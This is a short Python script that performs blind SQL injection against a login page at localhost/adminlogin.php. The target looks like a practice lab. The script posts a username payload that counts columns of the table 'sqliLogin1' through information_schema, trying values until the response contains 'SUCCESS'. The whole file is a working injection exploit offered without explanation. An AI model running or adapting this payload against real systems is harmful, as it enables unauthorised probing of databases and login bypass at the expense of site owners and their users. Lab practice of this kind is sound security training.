import requests

URL = "http://localhost/adminlogin.php"

for cnt in range(1, 255):
	sqlquery = "' or 1=1 AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='sqliLogin1')="+str(cnt) + "# "
	postquery = "username=" + sqlquery + "&password=1&form=submit"
	res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})

	if "SUCCESS" in res.text:
		print(f"done! COLUMN COUNT : {cnt}")
		break